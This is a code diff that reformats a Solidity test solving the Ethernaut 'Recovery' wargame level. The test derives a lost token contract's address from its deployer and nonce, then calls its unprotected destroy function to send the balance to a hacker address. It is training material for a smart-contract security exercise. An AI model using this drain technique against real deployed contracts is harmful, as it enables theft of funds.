@@ -31,18 +31,20 @@ contract RecoveryTest is DSTest {
         // LEVEL ATTACK //
         //////////////////
 
-        // targetAddress = keccak256(RLP(sender, nonce))      
-        address targetAddress = address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), address(levelAddress), bytes1(0x01))))));
+        // targetAddress = keccak256(RLP(sender, nonce))
+        address targetAddress = address(
+            uint160(
+                uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), address(levelAddress), bytes1(0x01))))
+            )
+        );
 
         SimpleToken simpleToken = SimpleToken(payable(targetAddress));
         simpleToken.destroy(payable(hacker));
-        
+
         //////////////////////
         // LEVEL SUBMISSION //
         //////////////////////
-        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
-            payable(levelAddress)
-        );
+        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
         vm.stopPrank();
         assert(levelSuccessfullyPassed);
     }
